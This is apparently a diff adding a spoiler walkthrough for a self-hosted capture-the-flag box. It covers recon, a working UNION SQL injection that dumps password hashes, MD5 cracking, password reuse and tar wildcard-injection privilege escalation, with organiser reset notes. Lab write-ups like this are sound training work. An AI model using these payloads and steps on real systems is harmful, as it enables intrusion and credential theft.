@@ -1,0 +1,180 @@
+# ECorpNet: Breach & Climb — walkthrough
+
+> **SPOILER.** Full intended path from recon to root. Keep it in the private repo;
+> `box/provision.sh` never copies it onto the box.
+
+Box built by `sudo ./box/provision.sh` (Debian 13). Flags are random per box:
+`/root/.ctf-flags` on the server.
+
+| Stage | From → To | Technique | Flag |
+|---|---|---|---|
+| 0 | — | Recon: ports, web content, API discovery | — |
+| 1 | anonymous → contractor | Self-registration | — |
+| 2 | contractor → admin (web) | UNION SQLi in `/api/v1/employees` → unsalted MD5 → rockyou | — |
+| 3 | admin → `ecorpnet` shell | SSTI in admin email-template preview | — |
+| 4 | `ecorpnet` → `pnair` | Cleartext creds in `/etc/ecorpnet/backup.conf`, password reuse | `user.txt` |
+| 5 | `pnair` → root | `sudo` script runs `tar … *` in a pnair-writable dir (wildcard injection) | `root.txt` |
+
+```bash
+export T=10.42.0.62          # box
+export B=http://$T
+```
+
+---
+
+## 0. Recon  ✅ verified
+
+```bash
+nmap -sC -sV -p- --min-rate 2000 -T4 $T
+```
+```
+22/tcp open  ssh   OpenSSH 10.0p2 Debian 7+deb13u4
+80/tcp open  http  nginx
+|_http-title: Did not follow redirect to /login?next=/
+```
+
+Web content:
+```bash
+ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -mc 200,301,302,308,401,403
+# admin directory documents login profile register reports tickets
+
+ffuf -s -u $B/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+     -mc 200,301,302,308,401,403
+# api/v1/me        <- 401: an authenticated JSON API exists
+```
+
+`/register` is open: E Corp lets external contractors self-register.
+
+## 1. Foothold in the portal — contractor account  ✅ verified
+
+```bash
+csrf() { curl -s "$@" | grep -oP 'csrf_token" value="\K[^"]+' | head -1; }
+
+T1=$(csrf -c jar.txt $B/register)
+curl -s -b jar.txt -c jar.txt -X POST $B/register \
+  --data-urlencode username=mallory --data-urlencode "full_name=Mallory Riot" \
+  --data-urlencode company=Allsafe  --data-urlencode email=mallory@allsafe.example \
+  --data-urlencode 'password=Passw0rd!' --data-urlencode 'confirm=Passw0rd!' \
+  --data-urlencode csrf_token=$T1                       # 302 -> /login
+
+T1=$(csrf -c jar.txt $B/login)
+curl -s -b jar.txt -c jar.txt -X POST $B/login \
+  --data-urlencode username=mallory --data-urlencode 'password=Passw0rd!' \
+  --data-urlencode csrf_token=$T1                       # 302 -> /
+
+curl -s -b jar.txt $B/api/v1/
+# {"endpoints":["/api/v1/me","/api/v1/employees","/api/v1/employees/<id>",...]}
+```
+
+## 2. SQL injection → admin password  ✅ verified
+
+The web UI's directory search is safe; the API's `?q=` is not.
+
+```bash
+curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode "q='"
+# 500 Internal Server Error   <- broken SQL
+```
+
+The query is `... WHERE is_active = 1 AND (full_name LIKE '%<q>%' OR ...)` and
+returns 9 columns (`id, username, full_name, email, title, department, phone,
+office, manager_id` — visible in any normal API response). SQLite.
+
+```bash
+curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode \
+ "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,role,department,phone,office,manager_id FROM users--" \
+ | python3 -c 'import sys,json; [print(f"{r[\"username\"]}:{r[\"full_name\"]}  ({r[\"title\"]})") for r in json.load(sys.stdin)]'
+```
+```
+pprice:0691df26da82d6eb2e5da8924628db63  (admin)
+tcolby:034a1fd13b5abe6cc8bb1354e4e95040  (manager)
+...
+```
+
+32 hex chars, no salt → raw MD5:
+```bash
+# output of the previous command, without the "(role)" part
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show --format=raw-md5 hashes.txt
+# pprice:bowwow        (rockyou line 300; the other 14 hashes do not crack — by design)
+```
+
+Sign in as **pprice / bowwow** → Administrator (Phillip Price, CEO).
+Note: online brute force is not an option — 10 failures per IP+user / 10 min lockout.
+
+## 3. Admin → shell as `ecorpnet`  ⬜ verify yourself
+
+**Where:** Admin → Email templates (`/admin/comms/<id>`) → **Preview** button.
+
+**Bug:** `ecorpnet/comms.py` renders the preview with Flask's
+`render_template_string` (not sandboxed) on the attacker-controlled body and
+subject → Jinja2 SSTI → Python → OS commands.
+
+**Steps:**
+1. Confirm SSTI with a harmless arithmetic expression in the body — the preview shows the evaluated result.
+2. Escalate to command execution and a reverse shell — the working payload is in
+   `README.md` → "Intended exploitation path", step 6 (mind the note on backgrounding the shell).
+3. Upgrade to a PTY (needed for `su` in the next stage).
+
+**Expect:** `id` → `uid=…(ecorpnet) gid=…(ecorpnet)`, cwd `/opt/ecorpnet/app`.
+The app code is read-only for you (root-owned + systemd `ReadOnlyPaths`), so you can't wreck it for other players.
+
+**Checks for the organiser:**
+- `su`/`sudo` must work from this shell (the unit no longer has `NoNewPrivileges=yes`).
+- `ls /home` must list `pnair` (`ProtectHome=read-only`, not `yes`).
+
+## 4. `ecorpnet` → `pnair` (user flag)  ⬜ verify yourself
+
+**Enumeration** (manual or linPEAS — "interesting files / passwords in config"):
+```bash
+id; ls -la /home
+grep -ril 'pass' /etc 2>/dev/null    # among the results: /etc/ecorpnet/backup.conf
+ls -la /etc/ecorpnet/                # root:ecorpnet 640 — readable by our group
+```
+
+`backup.conf` belongs to Priya Nair (IT Operations) and contains `BACKUP_USER` /
+`BACKUP_PASS` with a "this is my login for now" TODO → password reuse.
+
+```bash
+su pnair            # needs the PTY from stage 3
+# or, simpler and more stable:
+ssh pnair@$T
+cat ~/user.txt      # flag{...}
+```
+
+## 5. `pnair` → root (root flag)  ⬜ verify yourself
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/local/bin/steelmountain-backup
+cat /usr/local/bin/steelmountain-backup
+ls -ld /srv/reports       # owned by pnair
+```
+
+**Bug:** the script runs as root, `cd /srv/reports` and then `tar czf … *`.
+The shell expands `*` into file names *before* tar runs, so a file whose name
+looks like a tar option is parsed as an option. pnair can create files in
+`/srv/reports` → controls tar's arguments as root.
+
+**Technique:** GTFOBins → `tar` → *Sudo* / *Shell* (the `--checkpoint` /
+`--checkpoint-action` options), delivered through file names in `/srv/reports`
+(classic "tar wildcard injection").
+
+**Expect:** a root shell or a root-owned SUID copy of bash → `cat /root/root.txt` → `flag{...}`.
+
+Notes for players who come from the web shell: root obtained inside
+`ecorpnet.service` is still in its sandbox (`/usr`, `/etc`, `/root` read-only,
+`PermitRootLogin no`) — enough to read the flag, not to persist.
+
+---
+
+## Organiser notes
+
+- Reset between rounds: `sudo ctf-reset` (kills player shells, reseeds DB, restores `/srv/reports`, `/home/pnair`, flags).
+- Rotate flags: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh`.
+- Before players connect: no other account (e.g. the admin's own) may have a weak password — anyone in the `sudo` group with a guessable password = free root over SSH. Remove `~/ctf-src` from the box.
+
+### Unintended-path checklist (verified on 2026-11-11)
+- Only `pprice` is in rockyou; other web users' hashes do not crack.
+- No SUID outside the Debian defaults; no root cron jobs.
+- CUPS (631) listens on localhost only.
